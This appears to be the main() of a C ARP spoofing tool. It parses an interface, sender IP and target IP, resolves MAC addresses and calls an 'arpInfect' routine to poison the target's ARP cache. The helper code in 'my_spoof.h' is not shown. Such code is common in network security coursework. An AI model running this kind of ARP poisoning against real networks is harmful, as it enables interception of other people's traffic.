#include "my_spoof.h"

int main(int argc, char* argv[]){
    struct in_addr sender_ip;
    struct in_addr target_ip;
    unsigned char my_mac[6];
    unsigned char *target_mac;

    if(argc != 4){
        usage();
        return 0;
    }
    char *dev = argv[1];
    inet_aton(argv[2], &sender_ip);
    inet_aton(argv[3], &target_ip);
    findMyMac(dev, my_mac);
    target_mac = getYourMac(dev, &target_ip, &sender_ip, my_mac);
    arpInfect(dev, &target_ip, &sender_ip, my_mac, target_mac);
    return 0;
}
